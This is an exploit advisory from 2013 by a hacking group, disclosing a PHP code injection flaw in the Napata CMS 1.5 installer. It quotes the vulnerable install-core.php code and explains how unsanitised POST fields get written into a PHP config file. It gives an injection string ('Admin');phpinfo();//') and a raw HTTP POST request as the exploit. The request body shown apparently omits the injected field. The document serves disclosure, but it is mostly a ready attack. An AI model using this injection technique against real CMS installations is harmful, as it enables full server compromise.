# Date            : 5 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://napata-cms.blogspot.com/
# Software Link   : http://sourceforge.net/projects/napatacms/files/latest/download
# Version         : 1.5.2013
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------&#039;     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /          
  / XXXXXX /
 (________(            
  `------&#039;

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/install/install-core.php (LINE: 123-151)

-----------------------------------------------------------------------------
LINE 123-149: 

    function SaveSettings () {
global $_POST;
if(isset($_POST[&#039;save_settings&#039;]))
{

  echo &#039;The config file has been written ......<br />&#039;;
  $default_time = isset($_POST[&#039;default_time&#039;]) ? $_POST[&#039;default_time&#039;] : &#039;UTC&#039;;
  $db_host = isset($_POST[&#039;db_host&#039;]) ? $_POST[&#039;db_host&#039;] : &#039;localhost&#039;;
  $db_name = isset($_POST[&#039;db_name&#039;]) ? $_POST[&#039;db_name&#039;] : &#039;&#039;;
  $db_user = isset($_POST[&#039;db_user&#039;]) ? $_POST[&#039;db_user&#039;] : &#039;root&#039;;
  $db_password = isset($_POST[&#039;db_password&#039;]) ? $_POST[&#039;db_password&#039;] : &#039;&#039;;
  $ad_name = isset($_POST[&#039;ad_name&#039;]) ? $_POST[&#039;ad_name&#039;] : &#039;&#039;;
  $ad_username = isset($_POST[&#039;ad_username&#039;]) ? $_POST[&#039;ad_username&#039;] : &#039;admin&#039;;
  $ad_email = isset($_POST[&#039;ad_email&#039;]) ? $_POST[&#039;ad_email&#039;] : &#039;&#039;;
  $domain = isset($_POST[&#039;domain&#039;]) ? $_POST[&#039;domain&#039;] : &#039;&#039;;
  $sitename = isset($_POST[&#039;sitename&#039;]) ? addslashes($_POST[&#039;sitename&#039;]) : &#039;Napata CMS&#039;;
  $tagline = isset($_POST[&#039;tagline&#039;]) ? addslashes($_POST[&#039;tagline&#039;]) : &#039;A different CMS&#039;;
  $home_articles = isset($_POST[&#039;home_articles&#039;]) ? $_POST[&#039;home_articles&#039;] : &#039;5&#039;;
  $static_homepage = isset($_POST[&#039;homepage&#039;]) ? addslashes($_POST[&#039;homepage&#039;]) : &#039;&#039;;
  $twitter = isset($_POST[&#039;twitter&#039;]) ? $_POST[&#039;twitter&#039;] : &#039;http://twitter.com/username&#039;;
  $facebook = isset($_POST[&#039;facebook&#039;]) ? $_POST[&#039;facebook&#039;] : &#039;http://www.facebook.com&#039;;
  $linkedin = isset($_POST[&#039;linkedin&#039;]) ? $_POST[&#039;linkedin&#039;] : &#039;http://www.linkedin.com&#039;;
  $youtube = isset($_POST[&#039;youtube&#039;]) ? $_POST[&#039;youtube&#039;] : &#039;http://www.youtube.com&#039;;
  $flickr = isset($_POST[&#039;flickr&#039;]) ? $_POST[&#039;flickr&#039;] : &#039;http://www.flickr.com&#039;;
  $version = VERSION;
-----------------------------------------------------------------------------
    
-----------------------------------------------------------------------------
LINE 151: 

    $fh = fopen("include/settings/base.php", &#039;w+&#039;) or die("Could not create the config file. Please check the file permissions to the cms installation folder.");

-----------------------------------------------------------------------------

#####################################################
DESCRIPTION
#####################################################

An attacker might write to arbitrary files or inject arbitrary code into a file with this vulnerability. 
User tainted data is used when creating the file name that will be opened or when creating the string that will be written to the file. 
An attacker can try to write arbitrary PHP code in a PHP file allowing to fully compromise the server.

This CMS has input validation by addslashes() function (LINE: 140,141,143). Anyway attacker able to insert PHP code "Admin&#039;);phpinfo();//" into other parameter 
that&#039;s not properly sanitized.

/settings/base.php
-----------------------------------------------------------------------------
...
date_default_timezone_set(&#039;UTC&#039;);
        define (&#039;DATABASE_HOST&#039;, &#039;localhost&#039;);
        define (&#039;DATABASE_NAME&#039;, &#039;napata&#039;);
        define (&#039;DATABASE_USER_NAME&#039;, &#039;root&#039;);
        define (&#039;DATABASE_PASSWORD&#039;, &#039;myDB@dm1n&#039;);
        define(&#039;ADMIN_NAME&#039;,&#039;Admin&#039;);phpinfo();//&#039;);
        define(&#039;ADMIN_USERNAME&#039;,&#039;admin&#039;);
...
-----------------------------------------------------------------------------

#####################################################
EXPLOIT
#####################################################


POST /napata/install.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/napata/install.php
Cookie: lang=en_US; PHPSESSID=s291lhmkfa4qsjk5kb5k5268e3
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 525

ad_email=admin%40this-site.com&domain=www.what-is-my-site-domain.me&sitename=Napata+CMS&tagline=A+different+CMS&home_articles=5&homepage=About+Us&
twitter=http%3A%2F%2Ftwitter.com%2Fusername&facebook=http%3A%2F%2Fwww.facebook.com&linkedin=http%3A%2F%2Fwww.linkedin.com&youtube=http%3A%2F%2Fwww.youtube.com&
flickr=http%3A%2F%2Fwww.flickr.com&save_settings=Save+Settings

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
################################################################################################################

